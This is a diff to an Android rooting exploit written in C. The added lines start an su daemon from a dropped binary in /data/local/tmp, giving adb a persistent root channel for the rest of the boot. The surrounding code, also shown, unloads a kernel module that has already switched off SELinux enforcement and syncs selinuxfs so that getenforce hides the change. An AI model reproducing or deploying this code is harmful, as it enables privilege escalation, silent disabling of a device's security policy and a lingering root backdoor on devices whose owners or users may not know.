@@ -540,6 +540,14 @@ int main(void)
     if (!late_load_resident)
         run_ctx(NULL, (char *[]){ "/system/bin/rmmod", "dfroot", NULL });
 
+    /* Start the su daemon from this root context.  adb shell can then exec
+     * /data/local/tmp/su (mode 0755, left by an earlier session) for the rest
+     * of this boot - the closest thing to a general-purpose root channel this
+     * setup has.  Backgrounded so run_ctx's waitpid returns immediately. */
+    run_ctx(NULL, (char *[]){ "/system/bin/sh", "-c",
+        "/data/local/tmp/su --daemon >/data/local/tmp/su_daemon.log 2>&1 &",
+        NULL });
+
     /* Sync the selinuxfs view of the enforcing switch dfroot.ko already
      * flipped (byte0 of selinux_state), so getenforce stops lying.  LAST on
      * purpose: a selinuxfs enforce write stalled the exploit twice when run
